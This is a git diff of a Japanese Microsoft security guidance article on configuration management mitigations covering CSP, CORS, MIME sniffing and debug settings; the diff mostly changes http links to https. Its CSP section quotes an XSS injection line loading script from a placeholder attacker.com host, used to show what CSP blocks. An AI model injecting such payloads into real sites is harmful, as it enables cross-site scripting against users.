@@ -14,12 +14,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: b24d32afed5acfd846f9a8e8316339665524ad2e
-ms.sourcegitcommit: 11d8ce8cd720a1ec6ca130e118489c6459e04114
+ms.openlocfilehash: 284d0e888b89d340088f770af22c026a861a4685
+ms.sourcegitcommit: f24fdd1ab23927c73595c960d8a26a74e1d12f5d
 ms.translationtype: HT
 ms.contentlocale: ja-JP
-ms.lasthandoff: 12/04/2018
-ms.locfileid: "52849770"
+ms.lasthandoff: 03/27/2019
+ms.locfileid: "58498385"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>セキュリティ フレーム:構成管理 | 対応策 
 | 製品/サービス | 記事 |
@@ -42,7 +42,7 @@ ms.locfileid: "52849770"
 | **SDL フェーズ**               | 構築 |  
 | **適用できるテクノロジ** | ジェネリック |
 | **属性**              | 該当なし  |
-| **参照**              | [コンテンツ セキュリティ ポリシーの概要](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[コンテンツ セキュリティ ポリシー リファレンス](http://content-security-policy.com/)、[セキュリティ機能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[コンテンツ セキュリティ ポリシーの概要](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)、[CSP が使用可能か](http://caniuse.com/#feat=contentsecuritypolicy) |
+| **参照**              | [コンテンツ セキュリティ ポリシーの概要](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[コンテンツ セキュリティ ポリシー リファレンス](https://content-security-policy.com/)、[セキュリティ機能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[コンテンツ セキュリティ ポリシーの概要](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)、[CSP が使用可能か](https://caniuse.com/#feat=contentsecuritypolicy) |
 | **手順** | <p>コンテンツ セキュリティ ポリシー (CSP) は、W3C 標準の多層防御セキュリティ メカニズムです。このポリシーを使用すると、Web アプリケーション所有者が、自身のサイトに埋め込まれたコンテンツを制御できます。 CSP は、Web サーバー上で HTTP 応答ヘッダーとして追加され、ブラウザーによってクライアント側で適用されます。 これはホワイトリスト ベースのポリシーで、Web サイトが、信頼されたドメインのセットを宣言できます。このドメインから、JavaScript などのアクティブ コンテンツを読み込むことができます。</p><p>CSP のセキュリティ上の利点を次に示します。</p><ul><li>**XSS に対する保護:** ページが XSS に対して脆弱である場合、攻撃者がそれを悪用する方法は 2 つあります。<ul><li>`<script>malicious code</script>` を挿入する。 このエクスプロイトは、CSP の基本制限 1 により動作しません</li><li>`<script src=”http://attacker.com/maliciousCode.js”/>` を挿入する。 攻撃者が制御するドメインは、ドメインの CSP のホワイトリストに追加されないため、このエクスプロイトは動作しません</li></ul></li><li>**データ流出の制御:** Web ページの悪意のあるコンテンツが外部 Web サイトに接続して、データを盗もうとすると、CSP によって接続が中断されます。 接続先ドメインは、CSP のホワイトリストに追加されないためです</li><li>**クリックジャッキングに対する防御:** クリックジャッキングは、敵が正規の Web サイトを偽装して、ユーザーに UI 要素を強制的にクリックさせる攻撃方法です。 現時点では、クリックジャッキングに対する防御は、X-Frame-Options 応答ヘッダーを構成することで実現します。 すべてのブラウザーがこのヘッダーを使用しているわけではありません。今後は、CSP がクリックジャッキングに対する標準的な防御方法になります</li><li>**リアルタイム攻撃レポート:** CSP 対応の Web サイトがインジェクション攻撃を受けると、Web サーバーで構成されているエンドポイントへの通知が自動的にトリガーされます。 このように、CSP は、リアルタイムの警告システムとして機能します。</li></ul> |
 
 ### <a name="example"></a>例
@@ -85,7 +85,7 @@ Example: var str="alert(1)"; eval(str);
 | **SDL フェーズ**               | 構築 |  
 | **適用できるテクノロジ** | ジェネリック |
 | **属性**              | 該当なし  |
-| **参照**              | [ASP.NET デバッグの概要](http://msdn2.microsoft.com/library/ms227556.aspx)、[ASP.NET トレースの概要](http://msdn2.microsoft.com/library/bb386420.aspx)、[方法:ASP.NET アプリケーションのトレースを有効にする](http://msdn2.microsoft.com/library/0x5wc973.aspx)、[方法:ASP.NET アプリケーションのデバッグを有効にする](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
+| **参照**              | [ASP.NET デバッグの概要](https://msdn.microsoft.com/library/ms227556.aspx)、[ASP.NET トレースの概要](https://msdn.microsoft.com/library/bb386420.aspx)、[方法:ASP.NET アプリケーションのトレースを有効にする](https://msdn.microsoft.com/library/0x5wc973.aspx)、[方法:ASP.NET アプリケーションのデバッグを有効にする](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
 | **手順** | ページのトレースが有効になっていると、それを要求しているブラウザーも、内部サーバーの状態とワークフローのデータを含むトレース情報をそれぞれ取得します。 それが機密情報であることがあります。 ページでデバッグが有効になっている場合、サーバーでエラーが発生すると、ブラウザーに完全なスタック トレース データのサーバーが提供されます。 そのデータによって、サーバーのワークフローに関する機密情報が公開される場合があります。 |
 
 ## <a id="js-trusted"></a>信頼できるソースのサード パーティ製 javascript にのみアクセスする
@@ -152,7 +152,7 @@ Web.config にアクセスできる場合、CORS は、次のコードを使用�
     <httpProtocol>
       <customHeaders>
         <clear />
-        <add name="Access-Control-Allow-Origin" value="http://example.com" />
+        <add name="Access-Control-Allow-Origin" value="https://example.com" />
       </customHeaders>
     </httpProtocol>
 ```
@@ -160,7 +160,7 @@ Web.config にアクセスできる場合、CORS は、次のコードを使用�
 ### <a name="example"></a>例
 Web.config にアクセスできない場合、CORS を構成するには、次の CSharp コードを追加します。 
 ```csharp
-HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
+HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
 ```
 
 重要なのは、"Access-Control-Allow-Origin" 属性のオリジンのリストを、必ず信頼できる有限オリジン セットに設定することです。 この構成が不適切だと (例: "*" に設定する)、悪意のあるサイトが、Web アプリケーションへのクロス オリジン要求を無制限にトリガーできるため、アプリケーションが CSRF 攻撃に対して脆弱になります。 
@@ -173,7 +173,7 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example
 | **SDL フェーズ**               | 構築 |  
 | **適用できるテクノロジ** | Web フォーム、MVC5 |
 | **属性**              | 該当なし  |
-| **参照**              | [要求の検証 - スクリプト攻撃の防止](http://www.asp.net/whitepapers/request-validation) |
+| **参照**              | [要求の検証 - スクリプト攻撃の防止](https://www.asp.net/whitepapers/request-validation) |
 | **手順** | <p>要求の検証は ASP.NET 1.1 以降の機能で、エンコードされていない HTML を含むコンテンツを、サーバーが受け入れられないようにします。 この機能は、スクリプト インジェクション攻撃、つまり、クライアント スクリプト コードや HTML が知らないうちにサーバーに送信され、格納された後、他のユーザーに提供されるのを防ぐことを目的としています。 ただし、すべての入力データを適宜検証し、HTML エンコードを行うことを強くお勧めします。</p><p>要求の検証は、すべての入力データと、危険性のある値の一覧を比較することによって実行されます。 一致が見つかると、ASP.NET は `HttpRequestValidationException` を生成します。 要求の検証機能は既定で有効になっています。</p>|
 
 ### <a name="example"></a>例
@@ -210,7 +210,7 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example
 | **SDL フェーズ**               | 構築 |  
 | **適用できるテクノロジ** | ジェネリック |
 | **属性**              | 該当なし  |
-| **参照**              | [IE8 のセキュリティ パート V:包括的な保護](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx)、[MIME タイプ](http://en.wikipedia.org/wiki/Mime_type) |
+| **参照**              | [IE8 のセキュリティ パート V:包括的な保護](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx)、[MIME タイプ](https://en.wikipedia.org/wiki/Mime_type) |
 | **手順** | X-Content-Type-Options ヘッダーは、コンテンツを MIME スニッフィングしないことを開発者が指定できる HTTP ヘッダーです。 このヘッダーは、MIME スニッフィング攻撃を軽減することを目的としています。 ユーザーが制御可能なコンテンツが含まれている可能性のある各ページで、X-Content-Type-Options:nosniff HTTP ヘッダーを使用する必要があります。 この必須のヘッダーをアプリケーションのすべてのページでグローバルに有効にするには、次のいずれかを実行します|
 
 ### <a name="example"></a>例
@@ -297,7 +297,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | **SDL フェーズ**               | 構築 |  
 | **適用できるテクノロジ** | MVC 5 |
 | **属性**              | 該当なし  |
-| **参照**              | [ASP.NET Web API 2 でのクロス オリジン要求を有効にする](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api)、[ASP.NET Web API - ASP.NET Web API 2 における CORS サポート](https://msdn.microsoft.com/magazine/dn532203.aspx) |
+| **参照**              | [ASP.NET Web API 2 でのクロス オリジン要求を有効にする](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api)、[ASP.NET Web API - ASP.NET Web API 2 における CORS サポート](https://msdn.microsoft.com/magazine/dn532203.aspx) |
 | **手順** | <p>ブラウザーのセキュリティ機能により、Web ページでは AJAX 要求を別のドメインに送信することはできません。 この制限は、同一オリジン ポリシーと呼ばれ、悪意のあるサイトが、別のサイトから機密データを読み取れないようにします。 ただし、場合によっては、他のサイトが使用できるように、API を安全に公開しなければならないこともあります。 クロス オリジン リソース共有 (CORS) はW3C 標準で、サーバーによる同一オリジン ポリシーの緩和を許可します。</p><p>CORS を使用することで、サーバーが一部のクロス オリジン要求を、その他の要求を拒否しながら、明示的に許可することができます。 CORS は、JSONP など、以前の手法に比べて安全性と柔軟性が向上しています。</p>|
 
 ### <a name="example"></a>例
@@ -367,7 +367,7 @@ public class ResourcesController : ApiController
 ### <a name="example"></a>例
 クラスの特定のメソッドで CORS を無効にするには、次に示すように DisableCors 属性を使用できます。 
 ```csharp
-[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
+[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
 public class ResourcesController : ApiController
 {
   public HttpResponseMessage Put(Resource data)
@@ -404,7 +404,7 @@ public class ResourcesController : ApiController
 public void Configure(IApplicationBuilder app)
 {
     app.UseCors(builder =>
-        builder.WithOrigins("http://example.com")
+        builder.WithOrigins("https://example.com")
         .WithMethods("GET", "POST", "HEAD")
         .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
 }
@@ -418,7 +418,7 @@ public void ConfigureServices(IServiceCollection services)
     services.AddCors(options =>
     {
         options.AddPolicy("AllowSpecificOrigin",
-            builder => builder.WithOrigins("http://example.com"));
+            builder => builder.WithOrigins("https://example.com"));
     });
 }
 public void Configure(IApplicationBuilder app)
